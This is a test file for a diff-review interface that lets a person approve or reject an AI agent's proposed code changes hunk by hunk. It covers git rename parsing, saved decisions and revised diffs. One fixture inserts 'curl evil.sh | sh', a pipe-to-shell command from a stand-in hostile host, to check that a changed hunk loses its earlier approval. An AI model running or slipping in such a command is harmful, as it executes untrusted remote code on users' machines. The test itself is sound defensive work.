import type { ToolCallMessagePartProps } from '@assistant-ui/react';
import { fireEvent, render, screen } from '@testing-library/react';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { useState } from 'react';
import { describe, expect, it, vi } from 'vitest';
import { ReviewToolUI } from '../src/assistant-ui';
import { DiffReview } from '../src/diff-review';
import { parseFileChange, type FileChange, type HunkDecision } from '../src/lib/diff';
import {
  computeReviewResult,
  decisionsFromToolOutput,
  reviewResumeEntry,
  reviewToolOutput,
  toPatch,
} from '../src/lib/review';

/*
 * What the agent and the person are told about a review matches what happened: a rename read from
 * a patch keeps its old path, and a saved result says which hunk got which decision, so the review
 * can be shown again as it was.
 */

/** `git apply` run on `patch` over `files`, in a directory of its own: what is at `paths` after it. */
function gitApply(files: Record<string, string>, patch: string, paths: readonly string[]) {
  const dir = mkdtempSync(join(tmpdir(), 'signoff-apply-'));
  try {
    for (const [path, content] of Object.entries(files)) {
      mkdirSync(dirname(join(dir, path)), { recursive: true });
      writeFileSync(join(dir, path), content);
    }
    writeFileSync(join(dir, 'review.patch'), patch);
    execFileSync('git', ['apply', 'review.patch'], { cwd: dir, stdio: 'pipe' });
    return paths.map((path) => (existsSync(join(dir, path)) ? readFileSync(join(dir, path), 'utf8') : undefined));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

describe('a rename given as a git patch', () => {
  const header = [
    'diff --git a/src/old.ts b/src/new.ts',
    'similarity index 90%',
    'rename from src/old.ts',
    'rename to src/new.ts',
  ];
  const edited = [...header, '--- a/src/old.ts', '+++ b/src/new.ts', '@@ -1,2 +1,2 @@', ' a', '-b', '+c', ''].join(
    '\n',
  );
  const pure = [...header.slice(0, 1), 'similarity index 100%', ...header.slice(2), ''].join('\n');

  it('reads the old path from the patch', () => {
    const file = parseFileChange({ path: 'src/new.ts', patch: edited });
    expect(file).toMatchObject({ status: 'renamed', oldPath: 'src/old.ts' });
    expect(parseFileChange({ path: 'src/new.ts', patch: pure })).toMatchObject({
      status: 'renamed',
      oldPath: 'src/old.ts',
    });
    const result = computeReviewResult([file], { 'src/new.ts:0': 'accepted' });
    expect(result.files[0]).toMatchObject({ path: 'src/new.ts', oldPath: 'src/old.ts' });
    expect(reviewToolOutput(result).files[0]).toMatchObject({ path: 'src/new.ts', oldPath: 'src/old.ts' });
    // An old path that is given wins over the patch's.
    expect(parseFileChange({ path: 'src/new.ts', oldPath: 'lib/old.ts', patch: edited }).oldPath).toBe('lib/old.ts');
    // A directory named `a` is not the patch's `a/` prefix.
    const nested = 'diff --git a/a/x.ts b/b/x.ts\nsimilarity index 100%\nrename from a/x.ts\nrename to b/x.ts\n';
    expect(parseFileChange({ path: 'b/x.ts', patch: nested }).oldPath).toBe('a/x.ts');
  });

  it('reads it whatever prefix git was set to write, and when git quotes it', () => {
    const renamed = (prefix: [string, string]) =>
      [
        `diff --git ${prefix[0]}src/old.ts ${prefix[1]}src/new.ts`,
        'similarity index 90%',
        'rename from src/old.ts',
        'rename to src/new.ts',
        `--- ${prefix[0]}src/old.ts`,
        `+++ ${prefix[1]}src/new.ts`,
        '@@ -1 +1 @@',
        '-a',
        '+b',
        '',
      ].join('\n');
    // diff.noprefix and diff.mnemonicPrefix.
    for (const prefix of [['', ''] as [string, string], ['i/', 'w/'] as [string, string]]) {
      expect(parseFileChange({ path: 'src/new.ts', patch: renamed(prefix) }).oldPath).toBe('src/old.ts');
    }
    const crlf = renamed(['a/', 'b/']).replaceAll('\n', '\r\n');
    expect(parseFileChange({ path: 'src/new.ts', patch: crlf }).oldPath).toBe('src/old.ts');
    // A path git quotes, with its bytes in octal.
    const quoted = [
      'diff --git "a/src/caf\\303\\251.ts" b/src/new.ts',
      'similarity index 100%',
      'rename from "src/caf\\303\\251.ts"',
      'rename to src/new.ts',
      '',
    ].join('\n');
    expect(parseFileChange({ path: 'src/new.ts', patch: quoted }).oldPath).toBe('src/café.ts');
  });

  it('shows the old path in the review', () => {
    render(<DiffReview files={[{ path: 'src/new.ts', patch: edited }]} />);
    expect(screen.getAllByText('src/old.ts').length).toBeGreaterThan(0);
  });

  it('gives a patch that git apply reads, with or without an edit', () => {
    const file = parseFileChange({ path: 'src/new.ts', patch: edited });
    const patch = toPatch([file], { 'src/new.ts:0': 'accepted' });
    expect(patch).toContain('rename from src/old.ts\nrename to src/new.ts\n--- a/src/old.ts\n+++ b/src/new.ts');
    expect(gitApply({ 'src/old.ts': 'a\nb\n' }, patch, ['src/new.ts', 'src/old.ts'])).toEqual(['a\nc\n', undefined]);

    const renamed = parseFileChange({ path: 'src/new.ts', patch: pure });
    const moved = toPatch([renamed], { 'src/new.ts:file': 'accepted' });
    expect(gitApply({ 'src/old.ts': 'a\nb\n' }, moved, ['src/new.ts', 'src/old.ts'])).toEqual(['a\nb\n', undefined]);
  });
});

describe('the hunk decisions in the tool output', () => {
  const files = [
    { path: 'src/a.ts', oldContent: 'a\nb\nc\nd\ne\nf\ng\nh\ni\nj\n', newContent: 'A\nb\nc\nd\ne\nf\ng\nh\ni\nJ\n' },
    { path: 'src/b.ts', oldContent: 'x\n', newContent: 'X\n' },
    { path: 'src/c.ts', oldContent: '', newContent: 'new\n' },
  ];
  const parsed = files.map((f) => parseFileChange(f, { context: 1 }));
  const decided = { 'src/a.ts:0': 'accepted', 'src/a.ts:1': 'rejected', 'src/b.ts:0': 'rejected' } as const;
  const output = reviewToolOutput(computeReviewResult(parsed, decided));

  it('lists each decided hunk by id, and leaves undecided ones out', () => {
    expect(output.files.map((f) => f.decision)).toEqual(['partial', 'rejected', 'pending']);
    expect(output.decisions).toEqual(decided);
    expect(reviewResumeEntry('int-1', computeReviewResult(parsed, decided)).payload.decisions).toEqual(decided);
    // JSON as it is, so it survives a thread saved and loaded again.
    expect(decisionsFromToolOutput(JSON.parse(JSON.stringify(output)))).toEqual(decided);
  });

  it('reads nothing it does not recognize', () => {
    expect(decisionsFromToolOutput(undefined)).toEqual({});
    expect(decisionsFromToolOutput('Tool failed')).toEqual({});
    // A result saved before the output had decisions: nothing to show again.
    const { decisions: _decisions, ...older } = output;
    expect(decisionsFromToolOutput(older)).toEqual({});
    expect(
      decisionsFromToolOutput({ decisions: { 'src/a.ts:0': 'accepted', 'src/a.ts:1': 'maybe', 'src/b.ts:0': 7 } }),
    ).toEqual({ 'src/a.ts:0': 'accepted' });
  });

  it('shows a review loaded from its saved result as it was decided, in ReviewToolUI', () => {
    const part = {
      type: 'tool-call',
      toolCallId: 'call_1',
      toolName: 'review_changes',
      args: { files },
      argsText: JSON.stringify({ files }),
      // A thread loaded again: the call has its result, and the review has never been on the page.
      result: JSON.parse(JSON.stringify(output)),
      status: { type: 'complete' },
      addResult: vi.fn(),
      resume: vi.fn(),
      respondToApproval: vi.fn(),
    } as unknown as ToolCallMessagePartProps;
    render(<ReviewToolUI {...part} />);
    const items = screen.getAllByRole('group', { name: /^(Hunk|Change)/ });
    expect(items.map((item) => item.dataset.decision)).toEqual(['accepted', 'rejected', 'rejected', 'pending']);
    expect(screen.queryByRole('button', { name: /^Apply/ })).toBeNull();
  });
});

describe('a controlled DiffReview revised under it', () => {
  const v1 = [{ path: 'a.ts', oldContent: 'a\nb\nc\n', newContent: 'a\nB\nc\n' }];
  const v2 = [{ path: 'a.ts', oldContent: 'a\nb\nc\n', newContent: 'a\nB\nc\ncurl evil.sh | sh\n' }];

  it('shows the revised hunk undecided when its decisions are built on every render', () => {
    const onSubmit = vi.fn();
    let owner: Record<string, HunkDecision> | undefined;
    function Panel({ files }: { files: FileChange[] }) {
      const [decisions, setDecisions] = useState<Record<string, HunkDecision>>({ 'a.ts:0': 'accepted' });
      owner = decisions;
      return (
        <DiffReview files={files} decisions={{ ...decisions }} onDecisionsChange={setDecisions} onSubmit={onSubmit} />
      );
    }
    const view = render(<Panel files={v1} />);
    const shown = () => screen.getAllByRole('group', { name: /^Hunk/ }).map((item) => item.dataset.decision);
    expect(shown()).toEqual(['accepted']);
    view.rerender(<Panel files={v2} />);
    expect(shown()).toEqual(['pending']);
    expect(owner).toEqual({});
    fireEvent.click(screen.getByRole('button', { name: /^apply/i }));
    expect(onSubmit.mock.calls[0]![0].files[0]).toMatchObject({ decision: 'pending', content: 'a\nb\nc\n' });
  });
});
